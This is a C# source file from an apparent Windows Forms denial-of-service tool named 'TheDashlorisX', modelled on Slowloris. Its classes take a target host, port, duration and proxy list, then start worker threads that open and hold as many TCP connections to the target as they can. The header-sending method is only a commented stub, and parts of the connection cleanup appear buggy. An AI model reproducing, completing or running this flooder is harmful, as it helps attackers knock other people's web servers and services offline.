
// Author: Dashie
// Version: 3.0

using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Text;
using System.Drawing;
using System.Threading;
using System.Collections;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Collections.Generic;

using DashFramework.Networking;
using DashFramework.Erroring;
using DashFramework.Dialog;

namespace TheDashlorisX
{
    public class AttaccLog
    { 
	public readonly SpruceLog SprucyLog = new SpruceLog();
	private readonly DashNet DashNet = new DashNet();


	private void SendLog(string Data, bool NewLine = true) =>
	    SprucyLog.SendLog(Data, false, NewLine);

	public bool Visible() =>
	    (SprucyLog.S1Container1.Visible);


	(string, int, int, string) ParseSect1(LockOn S3Class1)
	{
	    try
	    {
		if (!DashNet.CanIP(S3Class1.S2TextBox1.Text))
		{//individual parameters with values for identification externally.
		    return (null, -1, -1, null);
		}

		if (!DashNet.CanPort(S3Class1.S2TextBox2.Text))
		{
		    return (null, -1, -1, null);
		}

		if (!DashNet.CanDuration(S3Class1.S2TextBox3.Text))
		{
		    return (null, -1, -1, null);
		}

		int Duration = DashNet.GetInteger(S3Class1.S2TextBox3.Text);
		int Port = DashNet.GetPort(S3Class1.S2TextBox2.Text);

		string Replace(string Variable, string newValue, params string[] replaceValues)
		{
		    try
		    {
			foreach (string value in replaceValues)
			{
			    Variable = Variable.Replace(value, newValue);
			}

			return Variable;
		    }

		    catch (Exception E)
		    {
			throw (ErrorHandler.GetException(E));
		    }
		}

		string HTTPv = Replace(S3Class1.S2Label5.Text, "", "(", ")", "---", " ");
		string Host = DashNet.GetIP(S3Class1.S2TextBox1.Text);

		return (Host, Port, Duration, HTTPv);
	    }

	    catch (Exception E)
	    {
		throw (ErrorHandler.GetException(E));
	    }
	}

	(int, int, int, int, int, bool) ParseSect2(Settings S3Class2)
	{
	    try
	    {
		var possibleInts = new TextBox[]
		{
		    S3Class2.S2Textbox1,
		    S3Class2.S2Textbox2,
		    S3Class2.S2Textbox3,
		    S3Class2.S2Textbox4,
		    S3Class2.S2Textbox5
		};

		var Collection = new List<int>();

		foreach (var TextBox in possibleInts)
		{
		    if (!DashNet.CanInteger(TextBox.Text))
		    {
			return (-1, -1, -1, -1, -1, false);
		    }

		    Collection.Add(DashNet.GetInteger(TextBox.Text));
		}

		bool UAR = (S3Class2.S2Container3.BackColor == 
		    Color.DarkMagenta ? true : false);

		return (Collection[0], Collection[1], 
		    Collection[2], Collection[3], Collection[4], UAR);
	    }

	    catch (Exception E)
	    {
		throw (ErrorHandler.GetException(E));
	    }
	}

	(List<string>, List<string>) ParseSect3(Settings S3Class2)
	{
	    try
	    {
		return S3Class2.GetProxyData();
	    }

	    catch (Exception E)
	    {
		throw (ErrorHandler.GetException(E));
	    }
	}


	private readonly DashArtillery Artillery = new DashArtillery();

	public void CommenceLaunch(LockOn S3Class1, Settings S3Class2, DashWindow DashWindow, PictureBox Capsule)
	{
	    try
	    {
		if (SprucyLog.RequiresInit)
		{
		    void Invoker()
		    {
			try
			{
			    SprucyLog.InitializePage(DashWindow, Capsule);
			}

			catch (Exception E)
			{
			    throw (ErrorHandler.GetException(E));
			}
		    }

		    Capsule.Invoke(new MethodInvoker(Invoker));

		    foreach (Control Control in Capsule.Controls)
		    {
			if (Control.Visible)
			{
			    Control.Hide();
			}
		    }

		    SprucyLog.Show();
		}

		SendLog("- Validating configuration ....");

		/*Send Delay, Timeout, Dash Workers, Max Cons, Content Length and UAR*/
		(int, int, int, int, int, bool) Tier2 = ParseSect2(S3Class2);
		/*Proxy Hosts and Proxy Credentials*/
		(List<string>, List<string>) Tier3 = ParseSect3(S3Class2);
		/*Host, Port, Duration and HTTP Version*/
		(string, int, int, string) Tier1 = ParseSect1(S3Class1);

		if (Tier1.Item1 == null)
		{
		    SendLog("! The main host panel settings section was found incorrectly setup. Invalid values detected!");
		    return;
		}

		else if (Tier2.Item1 == -1)
		{
		    SendLog("! The main fancy settings section was found incorrectly setup. Invalid values detected!");
		    return;
		}

		else if (Tier3.Item1 == null)
		{
		    SendLog("! The proxy configuration section was found incorrectly setup. Invalid values detected!");
		    return;
		}

		SendLog("+ No errors found! proceeding with execution ....");

		Artillery.Launch(this, SprucyLog, Tier1, Tier2, Tier3);
	    }

	    catch (Exception E)
	    {
		ErrorHandler.JustDoIt(E);
	    }
	}


	public class DashArtillery
	{
	    private readonly DashNet DashNet = new DashNet();


	    private readonly System.Timers.Timer WorkTimer = new System.Timers.Timer()
	    {
		AutoReset = false,
		Interval = int.MaxValue -1,
		Enabled = false
	    };

	    private void StartDurationCounter(int Duration, SpruceLog Logy)
	    {
		try
		{
		    if (WorkTimer.Interval == int.MaxValue -1)
		    {
			WorkTimer.Elapsed += (s, e) =>
			{
			    Logy.SendLog("+ Timer finished 'Dashlorising' the given host!");
			    Logy.SendLog("- Give me a moment to catch my breath ....");

			    Logy.KeepStressing = false;
			};
		    }

		    WorkTimer.Interval = Duration;
		    WorkTimer.Enabled = true;

		    WorkTimer.Start();
		}

		catch (Exception E)
		{
		    throw (ErrorHandler.GetException(E));
		}
	    }

	    private void StopDurationCounter()
	    {
		try
		{
		    WorkTimer.Interval = int.MaxValue;
		    WorkTimer.Enabled = false;

		    WorkTimer.Stop();

		    Thread.Sleep(1000);//To add some breathing.
		}

		catch (Exception E)
		{
		    throw (ErrorHandler.GetException(E));
		}
	    }
	    
	    Socket GetSocket(string host, int port)
	    {
		try
		{
		    return (new Socket(DashNet.GetAddressFamily(host), SocketType.Stream, ProtocolType.Tcp)
			{ Blocking = true, LingerState = new LingerOption(true, 0), SendTimeout = 0, ReceiveTimeout = 0, NoDelay = true });
		}

		catch (Exception E)
		{
		    throw (ErrorHandler.GetException(E));
		}
	    }

	    private void SendArtillery((string, int, int, string) Tier1, (int, int, int, int, int, bool) Tier2)
	    {
		try
		{
		    //1: Construct Header (Get HTTP Version, User-Agent-Randomizator and Content Length) 
		    //2: Send Header
		}

		catch (Exception E)
		{
		    throw (ErrorHandler.GetException(E));
		}
	    }

	    private int CurrentConnections = 0;
	    private int CurrentRequests = 0;

	    private readonly System.Timers.Timer StatTimer = new System.Timers.Timer()
	    {
		AutoReset = true,
		Interval = int.MaxValue - 1,
		Enabled = false
	    };

	    private void StartStatUpdater(SpruceLog Logy)
	    {
		try
		{
		    if (StatTimer.Interval == int.MaxValue - 1)
		    {
			StatTimer.Elapsed += (s, e) =>
			{
			    Logy.S4TextBox1.Text = ($"{CurrentConnections}");
			    Logy.S4TextBox2.Text = ($"{CurrentRequests}");
			};
		    }

		    StatTimer.Interval = 500;
		    StatTimer.Enabled = true;

		    StatTimer.Start();
		}

		catch (Exception E)
		{
		    throw (ErrorHandler.GetException(E));
		}
	    }

	    private void StopStatUpdater()
	    {
		try
		{
		    StatTimer.Interval = int.MaxValue;
		    StatTimer.Enabled = false;

		    CurrentConnections = 0;
		    CurrentRequests = 0;
		    
		    StatTimer.Stop();
		}

		catch (Exception E)
		{
		    throw (ErrorHandler.GetException(E));
		}
	    }

	    private void ReportStatics(SpruceLog Logy, bool Add)
	    {
		try
		{
		    CurrentConnections = CurrentConnections + (Add ? 1 : -1);
		}

		catch (Exception E)
		{
		    throw (ErrorHandler.GetException(E));
		}
	    }

	    public void Launch(AttaccLog Inst, SpruceLog Logy, (string, int, int, string) Tier1, (int, int, int, int, int, bool) Tier2, (List<string>, List<string>) Tier3)
	    {
		try
		{
		    StartDurationCounter(Tier1.Item3, Logy);
		    StartStatUpdater(Logy);

		    void SendLog(string Message, bool MustVerbose = false)
		    {
			try
			{
			    if (MustVerbose && !Logy.KeepVerbosing)
			    {
				return;
			    }

			    Logy.SendLog($@"{Message}", MustVerbose);
			}

			catch (Exception E)
			{
			    throw (ErrorHandler.GetException(E));
			}
		    }

		    int SendDelay = Tier2.Item1;
		    int Timeout = Tier2.Item2;
		    int MaxCons = Tier2.Item4;
		    int Workers = Tier2.Item3;
		    int Port = Tier1.Item2;

		    string Host = Tier1.Item1;

		    SendLog($"- Starting {Workers} Dash Workers ....");

		    List<Thread> DashWorkers = new List<Thread>();

		    for (int Worker = 1; Worker <= Workers; Worker += 1)
		    {
			DashWorkers.Add(new Thread(() =>
			{
			    try
			    {
				List<Socket> Connections = new List<Socket>();

				while (Logy.KeepStressing)
				{
				    while (Connections.Count < (MaxCons / Workers))
				    {
					if (!Logy.KeepStressing)
					{
					    break;
					}

					Socket DashShell = GetSocket(Host, Port);

					var results = DashShell.BeginConnect(Host, Port, null, null);
					var success = results.AsyncWaitHandle.WaitOne(Timeout);

					if (DashShell.Connected)
					{
					    SendArtillery(Tier1, Tier2);
					    ReportStatics(Logy, true);//Add 

					    Connections.Add(DashShell);
					}

					else
					{
					    DashShell.Close();
					}

					CurrentRequests += 1;

					Thread.Sleep(SendDelay);
				    }

				    for (int Id = 0; Id < Connections.Count; Id += 1)
				    {
					if (!Connections[Id].Connected)
					{
					    Connections[Id].Close();
					    Connections.RemoveAt(Id);

					    ReportStatics(Logy, false);//Remove
					}
				    }

				    Thread.Sleep(SendDelay);
				}

				if (Connections.Count >= 50)
				{
				    for (int Connection = 0; Connection < Connections.Count / 4; Connection += 1)
				    {
					new Thread(() =>
					{
					    for (int Id = (Connections.Count / 4) * Connection; Id <= (Connections.Count / 4) * Connection; Id += 1)
					    {
						if (Connections[Id - 1].Connected)
						{
						    Connections[Id - 1].Close(0);
						}
					    }

					    Connections.Clear();
					})

					{ IsBackground = true }.Start();
				    }
				}

				else
				{
				    foreach (Socket Connection in Connections)
				    {
					if (Connection.Connected)
					{
					    Connection.Close(0);
					}
				    }

				    Connections.Clear();
				}
			    }

			    catch (Exception E)
			    {
				throw (ErrorHandler.GetException(E));
			    }
			}));
		    }

		    foreach (Thread DashWorker in DashWorkers)
		    {
			DashWorker.IsBackground = true;
			DashWorker.Start();
		    }

		    SendLog("+ Done starting Dash Workers!");
		    SendLog("- Waiting for Dash Workers to finish ....");

		    foreach (Thread DashWorker in DashWorkers)
		    {
			if (DashWorker.IsAlive)
			{
			    DashWorker.Join();
			}
		    }
		    
		    StopDurationCounter();
		    StopStatUpdater();
		}

		catch (Exception E)
		{
		    throw (ErrorHandler.GetException(E));
		}
	    }
	}
    }
}
